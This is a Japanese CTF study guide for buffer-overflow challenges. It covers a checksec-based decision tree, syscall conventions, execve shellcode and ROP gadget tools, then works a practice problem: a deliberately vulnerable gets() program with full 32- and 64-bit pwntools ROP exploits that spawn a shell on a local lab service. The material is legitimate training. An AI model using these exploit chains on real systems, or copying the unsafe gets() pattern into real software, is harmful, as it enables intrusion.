# BOF問のアプローチ方法

```
■step-01 checksecの結果を見てBOFかどうか確認　（判断つかない場合は逆アセンブル/逆コンパイルした結果も確認）
  checksec -> Canary found    -> カナリア値特定&BOF? ★fork+exec*している場合、off-by-one bofでカナリア値をリークできる場合、同時にfsbの脆弱性がある場合はカナリア値特定後にBOFで攻略できる可能性有
           -> No canary found -> 9割くらいの確率でBOF! 

■step-02　BOF問の可能性が高い場合は、以下の情報を参考にret2esp 、ret2plt/ret2libc 、 ropのいずれかで攻略していく
  NX disabled -> dynamically linked -> ret2esp? or シェルコード埋め込み&eip/rip制御?
  NX enabled  -> dynamically linked -> ret2plt/ret2libc? -> x86-64 -> leak libc_base -> 0x00混在入力 OK -> restart/stack pivoit -> system(3)/One Gadget RCE
                                                         -> x86-64 -> leak libc_base -> 0x00混在入力 NG -> restart              -> One Gadget RCE
                                                         -> x86    -> leak libc_base -> restart/stack pivoit -> system(3)
  NX enabled  -> statically linked  -> rop? ★今日はここ

  ★上記に該当しない場合、BOFかどうか分からない場合は特殊問の可能性が高いため、他メンバにもみてもらいましょう
  乱数予測? or 隠しメニュー? or fsb? or heap関連? ...

```

# ROPでの攻略法

## 準備： システムコールの呼び出し方
```

ガジェットを組み合わせてレジスタをセットし、システムコールを呼び出して解くケースがしばしばあります。
各CPUアーキテクチャでのシステムコールの呼び出し方を把握しておく必要があります。x86とx86-64でのシステムコールの呼び出し方を以下に記載します

■システムコールの呼び出し方(x86)

* aexにシステムコール番号をセット
* ebx, ecx, edxにそれぞれ一つ目、二つ目、三つ目の引数を格納
* int 0x80を実行
戻り値はeaxに格納される。

システムコール番号は以下で確認可能。

  e.g.
  /usr/src/kernels/${kernel_version}/arch/x86/include/asm/unistd_32.h
  https://github.com/torvalds/linux/tree/v2.6.24/include
  https://github.com/torvalds/linux/tree/master/include
  locate unistd_32.h

■参考：システムコールの呼び出し方(x64)

* レジスタraxにシステムコール番号をセット
* レジスタrdi,rsi,rdx,r10,r8,r9にそれぞれ一つ目、二つ目、三つ目、四つ目、五つ目、六つ目の引数を格納
* syscall 命令を実行
戻り値はraxに格納される。

システムコール番号は以下で確認可能。

  e.g.
  /usr/src/kernels/${kernel_version}/arch/x86/include/asm/unistd_64.h
  https://github.com/torvalds/linux/tree/v2.6.24/include
  https://github.com/torvalds/linux/tree/master/include
  locate unistd_64.h

■参考：system callの実行例(Linux, x86）
  ; execve(const char *filename, char *const argv [], char *const envp[]) ; */
  xor eax, eax ; eaxをゼロクリア
  push eax ; 文字列を終端させるためにnullバイトを格納
  push 0x68732f2f ; "//sh"をスタックにプッシュ
  push 0x6e69622f ; "/bin"をスタックにプッシュ
  mov ebx, esp ; 第1引数、"/bin//sh"のアドレスをebxに格納
  push eax ; スタックに32ビットのnull終端をプッシュ
  mov edx, esp ; 第3引数、envp用の空の配列をedxに格納
  push ebx ; null終端の上に"/bin//sh"のアドレスをプッシュ
  mov ecx, esp ; 第2引数、argvをecxに格納
  mov al, 11 ; システムコール番号11(*1)をeaxに格納
  int 0x80 ; システムコールを実行

  execve(2)はshellを奪取する場合に利用する。Pwn問題で頻繁に利用する

  ROPでは、例えば上記のmov al, 11の部分を.textセグメントのadd al, 11; add ecx, ecx ; retなどで置き換えて、システムコールを組み立てていく
  「命令列; ret」の部分をツールで抽出すると楽できる。
　ret2plt/ret2libcで関数を複数実行したい場合と同様に、ツールなどで抽出したretで終わる命令列のアドレスをスタックに配置していく
```

## 準備： ROPガジェット収集ツール

```
■xrop : https://github.com/acama/xrop
  e.g.
  $ xrop -n bof
  Searching ROP gadgets for "bof" - x86 Executable...
  (snip)
  > 0x804842f           90                        nop
  0x8048430             8B1C24                    mov    ebx,DWORD PTR [esp]
  0x8048433             C3                        ret
  (snip)
■rp-lin-x86/rp-lin-x64: https://github.com/0vercl0k/rp/releases
  e.g.
  $ rp-lin-x86 -r 3 --unique -f bof
  (snip)
  0x080485eb: pop ebp ; ret  ;  (1 found)
  0x08048379: pop ebx ; ret  ;  (2 found)
  0x080485ea: pop edi ; pop ebp ; ret  ;  (1 found)
  0x080485e9: pop esi ; pop edi ; pop ebp ; ret  ;  (1 found)
  (snip)
■ROPGadget :  https://github.com/JonathanSalwan/ROPgadget
  e.g.
  $ ROPgadget --binary bof --ropchain
  Gadgets information
  ============================================================
  0x0804873d : adc al, 0x41 ; ret
  0x080484ee : adc al, 0x50 ; call edx
  0x08048467 : adc cl, cl ; ret
  (snip)
```

## 練習問題

```
以下のソースコードから作成されるバイナリに対して、ROPでシェル起動を行う。

$ cat bof.c
#include <stdio.h>
#include <stdlib.h>

static void vuln() {
       char buf[100];
       gets(buf);
       printf("Hello! %s\n", buf);
}

int main() {
       setvbuf(stdout, 0, _IONBF, 0);
       puts("Can you tell me your name?");
       vuln();
       return 0;
}

32ビットの問題から行う。 32ビットバイナリへコンパイル。
$ gcc -m32 -static -fno-stack-protector -no-pie -o bof32 bof.c

$ checksec -f bof32
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   2046 Symbols    Yes     3               46      bof32

ROPgadgetを使用して、ropchainを生成する。
$ ROPgadget --binary bof32 --ropchain
<snip>
ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

        [+] Gadget found: 0x80510f5 mov dword ptr [esi], edi ; pop ebx ; pop esi ; pop edi ; ret
        [+] Gadget found: 0x80483b0 pop esi ; ret
        [+] Gadget found: 0x804867b pop edi ; ret
        [-] Can't find the 'xor edi, edi' gadget. Try with another 'mov [r], r'

        [+] Gadget found: 0x80549f2 mov dword ptr [edx], eax ; ret
        [+] Gadget found: 0x806eb8a pop edx ; ret
        [+] Gadget found: 0x80b9636 pop eax ; ret
        [+] Gadget found: 0x80491e3 xor eax, eax ; ret

- Step 2 -- Init syscall number gadgets

        [+] Gadget found: 0x80491e3 xor eax, eax ; ret
        [+] Gadget found: 0x807bf2c inc eax ; ret

- Step 3 -- Init syscall arguments gadgets

        [+] Gadget found: 0x80481c9 pop ebx ; ret
        [+] Gadget found: 0x8059963 pop ecx ; ret
        [+] Gadget found: 0x806eb8a pop edx ; ret

- Step 4 -- Syscall gadget

        [+] Gadget found: 0x806c7b5 int 0x80

- Step 5 -- Build the ROP chain

        #!/usr/bin/env python2
        # execve generated by ROPgadget

        from struct import pack

        # Padding goes here
        p = ''

        p += pack('<I', 0x0806eb8a) # pop edx ; ret
        p += pack('<I', 0x080ed080) # @ .data
        p += pack('<I', 0x080b9636) # pop eax ; ret
        p += '/bin'
        p += pack('<I', 0x080549f2) # mov dword ptr [edx], eax ; ret
        p += pack('<I', 0x0806eb8a) # pop edx ; ret
        p += pack('<I', 0x080ed084) # @ .data + 4
        p += pack('<I', 0x080b9636) # pop eax ; ret
        p += '//sh'
        p += pack('<I', 0x080549f2) # mov dword ptr [edx], eax ; ret
        p += pack('<I', 0x0806eb8a) # pop edx ; ret
        p += pack('<I', 0x080ed088) # @ .data + 8
        p += pack('<I', 0x080491e3) # xor eax, eax ; ret
        p += pack('<I', 0x080549f2) # mov dword ptr [edx], eax ; ret
        p += pack('<I', 0x080481c9) # pop ebx ; ret
        p += pack('<I', 0x080ed080) # @ .data
        p += pack('<I', 0x08059963) # pop ecx ; ret
        p += pack('<I', 0x080ed088) # @ .data + 8
        p += pack('<I', 0x0806eb8a) # pop edx ; ret
        p += pack('<I', 0x080ed088) # @ .data + 8
        p += pack('<I', 0x080491e3) # xor eax, eax ; ret
        p += pack('<I', 0x0807bf2c) # inc eax ; ret
        p += pack('<I', 0x0807bf2c) # inc eax ; ret
        p += pack('<I', 0x0807bf2c) # inc eax ; ret
        p += pack('<I', 0x0807bf2c) # inc eax ; ret
        p += pack('<I', 0x0807bf2c) # inc eax ; ret
        p += pack('<I', 0x0807bf2c) # inc eax ; ret
        p += pack('<I', 0x0807bf2c) # inc eax ; ret
        p += pack('<I', 0x0807bf2c) # inc eax ; ret
        p += pack('<I', 0x0807bf2c) # inc eax ; ret
        p += pack('<I', 0x0807bf2c) # inc eax ; ret
        p += pack('<I', 0x0807bf2c) # inc eax ; ret
        p += pack('<I', 0x0806c7b5) # int 0x80

上記のrop chainをそのまま用いて、exploit作成。

サーバ起動。
$ socat tcp-listen:7777,reuseaddr,fork exec:./bof32

同じホスト上で、別端末を開いて攻撃。
$ python3 exploit32.py
[+] Opening connection to 127.0.0.1 on port 7777: Done
[*] Switching to interactive mode */
Hello! aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x8\x86\x96\x0/bi\x8\x86\x96\x0//s\x8\?\x0\x8c\x99\x0\x8\x8\x,\xbf\x0,\xbf\x0,\xbf\x0,\xbf\x0,\xbf\x0,\xbf\x0,\xbf\x0,\xbf\x0,\xbf\x0,\xbf\x0,\xbf\x0\xb
$ ls
bof.c
bof32
bof64
exploit32.py
exploit64.py
flag
$ cat flag
flag{hogeee}

exploitコードは以下。
$ cat exploit32.py
from pwn import *

#r = process("./bof32")
r = remote("127.0.0.1", 7777)

ret_offset = 112

# do execve("/bin//sh", [NULL], [NULL])
payload = b'a' * ret_offset
payload += p32(0x0806eb8a) # pop edx ; ret
payload += p32(0x080ed080) # @ .data
payload += p32(0x080b9636) # pop eax ; ret
payload += b'/bin'
payload += p32(0x080549f2) # mov dword ptr [edx], eax ; ret
payload += p32(0x0806eb8a) # pop edx ; ret
payload += p32(0x080ed084) # @ .data + 4
payload += p32(0x080b9636) # pop eax ; ret
payload += b'//sh'
payload += p32(0x080549f2) # mov dword ptr [edx], eax ; ret
payload += p32(0x0806eb8a) # pop edx ; ret
payload += p32(0x080ed088) # @ .data + 8
payload += p32(0x080491e3) # xor eax, eax ; ret
payload += p32(0x080549f2) # mov dword ptr [edx], eax ; ret
payload += p32(0x080481c9) # pop ebx ; ret
payload += p32(0x080ed080) # @ .data
payload += p32(0x08059963) # pop ecx ; ret
payload += p32(0x080ed088) # @ .data + 8
payload += p32(0x0806eb8a) # pop edx ; ret
payload += p32(0x080ed088) # @ .data + 8
payload += p32(0x080491e3) # xor eax, eax ; ret
payload += p32(0x0807bf2c) # inc eax ; ret
payload += p32(0x0807bf2c) # inc eax ; ret
payload += p32(0x0807bf2c) # inc eax ; ret
payload += p32(0x0807bf2c) # inc eax ; ret
payload += p32(0x0807bf2c) # inc eax ; ret
payload += p32(0x0807bf2c) # inc eax ; ret
payload += p32(0x0807bf2c) # inc eax ; ret
payload += p32(0x0807bf2c) # inc eax ; ret
payload += p32(0x0807bf2c) # inc eax ; ret
payload += p32(0x0807bf2c) # inc eax ; ret
payload += p32(0x0807bf2c) # inc eax ; ret
payload += p32(0x0806c7b5) # int 0x80

r.recvuntil("Can you tell me your name?\n")
r.sendline(payload)
r.interactive()


次は64ビットを行う。64ビットのバイナリへコンパイル。
$ gcc -static -fno-stack-protector -no-pie -o bof64 bof.c

$ checksec -f bof64
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   1890 Symbols    Yes     3               46      bof64

同様にROPgadgetを使用して、ropchainを生成する。
$ ROPgadget --binary bof64 --ropchain
<snip>
ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

        [+] Gadget found: 0x46b251 mov qword ptr [rsi], rax ; ret
        [+] Gadget found: 0x4015d7 pop rsi ; ret
        [+] Gadget found: 0x4bee76 pop rax ; ret
        [+] Gadget found: 0x41e0af xor rax, rax ; ret

- Step 2 -- Init syscall number gadgets

        [+] Gadget found: 0x41e0af xor rax, rax ; ret
        [+] Gadget found: 0x45d9f0 add rax, 1 ; ret
        [+] Gadget found: 0x45d9f1 add eax, 1 ; ret

- Step 3 -- Init syscall arguments gadgets

        [+] Gadget found: 0x4014b6 pop rdi ; ret
        [+] Gadget found: 0x4015d7 pop rsi ; ret
        [+] Gadget found: 0x439a16 pop rdx ; ret

- Step 4 -- Syscall gadget

        [+] Gadget found: 0x400447 syscall

- Step 5 -- Build the ROP chain

        #!/usr/bin/env python2
        # execve generated by ROPgadget

        from struct import pack

        # Padding goes here
        p = ''

        p += pack('<Q', 0x00000000004015d7) # pop rsi ; ret
        p += pack('<Q', 0x00000000006c2080) # @ .data
        p += pack('<Q', 0x00000000004bee76) # pop rax ; ret
        p += '/bin//sh'
        p += pack('<Q', 0x000000000046b251) # mov qword ptr [rsi], rax ; ret
        p += pack('<Q', 0x00000000004015d7) # pop rsi ; ret
        p += pack('<Q', 0x00000000006c2088) # @ .data + 8
        p += pack('<Q', 0x000000000041e0af) # xor rax, rax ; ret
        p += pack('<Q', 0x000000000046b251) # mov qword ptr [rsi], rax ; ret
        p += pack('<Q', 0x00000000004014b6) # pop rdi ; ret
        p += pack('<Q', 0x00000000006c2080) # @ .data
        p += pack('<Q', 0x00000000004015d7) # pop rsi ; ret
        p += pack('<Q', 0x00000000006c2088) # @ .data + 8
        p += pack('<Q', 0x0000000000439a16) # pop rdx ; ret
        p += pack('<Q', 0x00000000006c2088) # @ .data + 8
        p += pack('<Q', 0x000000000041e0af) # xor rax, rax ; ret
        p += pack('<Q', 0x000000000045d9f0) # add rax, 1 ; ret
        p += pack('<Q', 0x000000000045d9f0) # add rax, 1 ; ret
        p += pack('<Q', 0x000000000045d9f0) # add rax, 1 ; ret
        p += pack('<Q', 0x000000000045d9f0) # add rax, 1 ; ret
<snip>
        p += pack('<Q', 0x000000000045d9f0) # add rax, 1 ; ret
        p += pack('<Q', 0x000000000045d9f0) # add rax, 1 ; ret
        p += pack('<Q', 0x000000000045d9f0) # add rax, 1 ; ret
        p += pack('<Q', 0x0000000000400447) # syscall

上記のrop chainをそのまま用いて、exploit作成。

サーバ起動。
$ socat tcp-listen:7777,reuseaddr,fork exec:./bof64

同じホスト上で、別端末を開いて攻撃。
$ python3 exploit64.py
[+] Opening connection to 127.0.0.1 on port 7777: Done
[*] Switching to interactive mode */
Hello! aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@
$ ls
bof.c
bof32
bof64
exploit32.py
exploit64.py
flag
$ cat flag
flag{hogeee}

exploitコードは以下。
$ cat exploit64.py
from pwn import *

#r = process("./bof64")
r = remote("127.0.0.1", 7777)

ret_offset = 120

# do execve("/bin//sh", [NULL], [NULL])
payload = b'a' * ret_offset
payload += p64(0x00000000004015d7) # pop rsi ; ret
payload += p64(0x00000000006c2080) # @ .data
payload += p64(0x00000000004bee76) # pop rax ; ret
payload += b'/bin//sh'
payload += p64(0x000000000046b251) # mov qword ptr [rsi], rax ; ret
payload += p64(0x00000000004015d7) # pop rsi ; ret
payload += p64(0x00000000006c2088) # @ .data + 8
payload += p64(0x000000000041e0af) # xor rax, rax ; ret
payload += p64(0x000000000046b251) # mov qword ptr [rsi], rax ; ret
payload += p64(0x00000000004014b6) # pop rdi ; ret
payload += p64(0x00000000006c2080) # @ .data
payload += p64(0x00000000004015d7) # pop rsi ; ret
payload += p64(0x00000000006c2088) # @ .data + 8
payload += p64(0x0000000000439a16) # pop rdx ; ret
payload += p64(0x00000000006c2088) # @ .data + 8
payload += p64(0x000000000041e0af) # xor rax, rax ; ret
for i in range(59):
    payload += p64(0x000000000045d9f0)    # add rax, 1 ; ret
payload += p64(0x0000000000400447) # syscall

r.recvuntil("Can you tell me your name?\n")
r.sendline(payload)
r.interactive()
```

## 過去事例

```
* angstromCTF - No libc for You 150 x86-64, ROP, shell起動不可 難度低
* TAMUctf 18 - pwn 5 200 x86, ROP 難度低
* INShAck 2019 - ropberry 386 x86, ROP 難度低
* Secure File Reader 200 x86, ROP, 0x00不可 難度低
* picoCTF 2018 - can-you-gets-me 650 x86, ROP, sshで接続してから攻略するタイプ 難度低
* Hackover CTF - ping_gnop 130 x86、stack pivot、ROP 難度低
* ALICTF - VSS 100 x86-64、stack pivot、ROP 難度低
* HITCON CTF - Start 500 x86-64、SSP有効、DEP有効、カナリア値特定、ROP、難度中
* IceCTF - ROPi 75 x86、バッファサイズ制限有、ROP 難度中

バッファサイズが制限されてもガジェットの工夫やret2plt/stack pivotで攻略可能

```
